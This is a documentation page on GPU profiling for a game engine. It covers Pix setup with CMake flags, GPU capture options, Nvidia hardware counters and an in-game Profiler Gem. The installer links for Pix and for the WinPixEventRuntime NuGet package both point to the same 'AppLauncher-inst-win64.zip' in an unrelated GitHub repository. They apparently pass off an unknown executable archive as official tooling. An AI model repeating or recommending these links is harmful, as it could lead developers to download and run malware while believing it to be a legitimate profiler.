---
title: "GPU-Profiling-Tools"
description: ""
toc: false
---

Link to a video that contains demo for various tools - https://youtu.be/WIUhaVXFDkc

## Pix (Build steps)

**Note:** Only available for DX12 on Windows

1. Install Pix ([installer link](https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip)). Version 2107.01 and later is supported at this time.
2. Download the [WinPixEventRuntime](https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip) nuget package (note that this link directs you to version 1.0.210818001 which is the currently supported version).
3. Unzip the nuget package (optionally by changing the file extension to `.zip`) either to `$LY_3RDPARTY_PATH/winpixeventruntime` or to a custom path
4. Set the CMake flag `LY_PIX_ENABLED` (pass `LY_PIX_ENABLED=ON` to your cmake configure command). 
5. If you unzipped the WinPixEventRuntime to an arbitrary path, set the cmake variable `LY_PIX_PATH` accordingly (note, this should point to where you extracted the WinPixEventRuntime package, *not* where the Pix executable is installed)
6. After regenerating and recompiling, you'll be able to do captures for CPU timings, or GPU analysis.

### Profiling

You have two options to do GPU captures:

* Launch your app from Pix with the 'Launch For GPU Capture' checkbox checked
* Run the executable with `--enablePixGPU`. Open pix and attach to your app with 'For GPU Capture' button enabled

NOTE: When attempting to profile applications launched as child-processes, use the "Attach to Process" functionality in Pix instead of trying to launch the process directly.

## GPU hardware counters

If you want to see GPU hardware counters in Pix, remember to enable performance counter access in the "Developer" options group of the Nvidia control panel (for developers using Nvidia cards).

To force the selection of a particular GPU adapter, use the `--forceAdapter="Your Adapter Name"` command line option. Note that the list of available devices is printed on startup.

## Other GPU Profilers

Other GPU profilers (e.g. Nvidia Nsight) also benefit from having Pix events to instrument the timeline.

## Profiler Gem (in-game GPU profiling)

**Supported on non-mobile platforms**

*  Build as you would normally
*  Enable the ImGui menu
    - **Host Platforms:** While running either the GameLauncher or Editor, press the "Home" key to bring up the ImGui menu
*  Select "Profiler" from the menu bar, then the "GPU Profiler" entry in the dropdown
![image](https://user-images.githubusercontent.com/47460854/213026200-0ba10290-e57e-4345-aad2-095f7d6bf620.png)

* You can press Pause/Resume to start/stop and display the last captured frame information. In the screenshot below I am using the "Flat" display instead of default "Hierarchical" display

![image](https://user-images.githubusercontent.com/47460854/213026740-b454f859-a950-4f4b-99b1-cda26697e6c3.png)

* You can also use features like "Hide Zero cost Passes" or "Show Timeline" to help better analyze the capture. 
